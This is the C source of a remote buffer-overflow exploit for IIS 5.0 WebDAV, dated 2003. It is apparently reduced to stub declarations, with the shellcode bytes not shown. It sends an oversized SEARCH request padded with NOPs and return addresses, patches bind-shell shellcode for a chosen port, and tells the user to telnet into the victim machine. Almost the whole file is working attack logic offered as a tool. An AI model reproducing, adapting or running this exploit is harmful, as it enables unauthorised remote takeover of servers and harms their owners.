
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;






struct sockaddr_in {void* sin_port; int sin_family; int sin_addr; } ;
struct sockaddr {int dummy; } ;
struct hostent {int h_length; int h_addr; } ;
typedef int dst ;


 int AF_INET ;
 int GETPROCADDRESS ;
 size_t GETPROC_OFFSET ;
 int LOADLIBRARYA ;
 size_t LOADL_OFFSET ;
 int MAXBUF ;
 int NOP ;
 size_t PORT_OFFSET ;
 int RET ;
 int SOCK_STREAM ;
 int atoi (char*) ;
 int bcopy (int ,int *,int ) ;
 char* body ;
 int bzero (char*,int) ;
 int close (int) ;
 int connect (int,struct sockaddr*,int) ;
 int exit (int) ;
 int fprintf (int ,char*,...) ;
 struct hostent* gethostbyname (char*) ;
 void* htons (int) ;
 char* jumpcode ;
 int memcpy (char*,char*,int) ;
 int memset (char*,int,int) ;
 int perror (char*) ;
 int printf (char*,...) ;
 int recv (int,char*,int,int ) ;
 int send (int,char*,int,int ) ;
 char* shellcode ;
 int socket (int ,int ,int ) ;
 int sprintf (char*,char*,char*,int) ;
 int stderr ;
 int strcpy (char*,char*) ;
 int strlen (char*) ;
 unsigned long strtoul (char*,int *,int) ;

int main (int argc, char **argv)
{

unsigned long ret;
unsigned short port;
int tport, bport, s, i, j, r, rt=0;
struct hostent *h;
struct sockaddr_in dst;
char buffer[MAXBUF];

if (argc < 2 || argc > 5)
{
printf("IIS 5.0 WebDAV Exploit by RoMaNSoFt <roman@rs-labs.com>. 23/03/2003\nUsage: %s <target host> [target port] [bind port] [ret]\nE.g 1: %s victim.com\nE.g 2: %s victim.com 80 31337 %#.4x\n", argv[0], argv[0], argv[0], RET);
exit(-1);
}


if (argc > 2)
tport = atoi(argv[2]);
else
tport = 80;


if (argc > 3)
bport = atoi(argv[3]);
else
bport = 31337;


if (argc > 4)
ret = strtoul(argv[4], ((void*)0), 16);
else
ret = RET;

if ( ret > 0xffff || (ret & 0xff) == 0 || (ret & 0xff00) == 0 )
{
fprintf(stderr, "RET value must be in 0x0000-0xffff range and it may not contain null-bytes\nAborted!\n");
exit(-2);
}


port = htons(bport);
port ^= 0x9999;

if ( ((port & 0xff) == 0) || ((port & 0xff00) == 0) )
{
fprintf(stderr, "Binding-port contains null-byte. Use another port.\nAborted!\n");
exit(-3);
}

*(unsigned short *)&shellcode[PORT_OFFSET] = port;
*(unsigned long *)&shellcode[LOADL_OFFSET] = LOADLIBRARYA ^ 0x99999999;
*(unsigned long *)&shellcode[GETPROC_OFFSET] = GETPROCADDRESS ^ 0x99999999;




printf("[*] Resolving hostname ...\n");
if ((h = gethostbyname(argv[1])) == ((void*)0))
{
fprintf(stderr, "%s: unknown hostname\n", argv[1]);
exit(-4);
}

bcopy(h->h_addr, &dst.sin_addr, h->h_length);
dst.sin_family = AF_INET;
dst.sin_port = htons(tport);


if ((s = socket(AF_INET, SOCK_STREAM, 0)) == -1)
{
perror("Failed to create socket");
exit(-5);
}


if (connect(s, (struct sockaddr *)&dst, sizeof(dst)) == -1)
{
perror("Failed to connect");
exit(-6);
}


printf("[*] Attacking port %i at %s (EIP = %#.4x%.4x)...\n", tport, argv[1], ((ret >> 8) & 0xff), ret & 0xff);

bzero(buffer, MAXBUF);
strcpy(buffer, "SEARCH /");

i = strlen(buffer);
buffer[i] = NOP;


for (j=i+1; j < i+2150; j+=2)
*(unsigned short *)&buffer[j] = (unsigned short)ret;


for (; j < i+65535-strlen(jumpcode); j++)
buffer[j] = NOP;


memcpy(&buffer[j], jumpcode, strlen(jumpcode));

strcpy(buffer+strlen(buffer), " HTTP/1.1\r\n");
sprintf(buffer+strlen(buffer), "Host: %s\r\nContent-Type: text/xml\r\nContent-Length: %d\r\n\r\n", argv[1], strlen(body) + strlen(shellcode));
strcpy(buffer+strlen(buffer), body);


memset(buffer+strlen(buffer), 0x01, 1);


memset(buffer+strlen(buffer), NOP, 3);
strcpy(buffer+strlen(buffer), shellcode);


if (send(s, buffer, strlen(buffer), 0) != strlen(buffer))
{
perror("Failed to send");
exit(-7);
}

printf("[*] Now open another console/shell and try to connect (telnet) to victim port %i...\n", bport);


while ( (r=recv(s, &buffer[rt], MAXBUF-1, 0)) > 0)
rt += r;



buffer[rt] = '\0';

if (rt > 0)
printf("[*] Victim server issued the following %d bytes of response:\n--\n%s\n--\n[*] Server NOT vulnerable!\n", rt, buffer);
else
printf("[*] Server is vulnerable but the exploit failed! Change RET value (e.g. 0xce04) and try again (when IIS is up again) :-/\n", bport);

close(s);

}
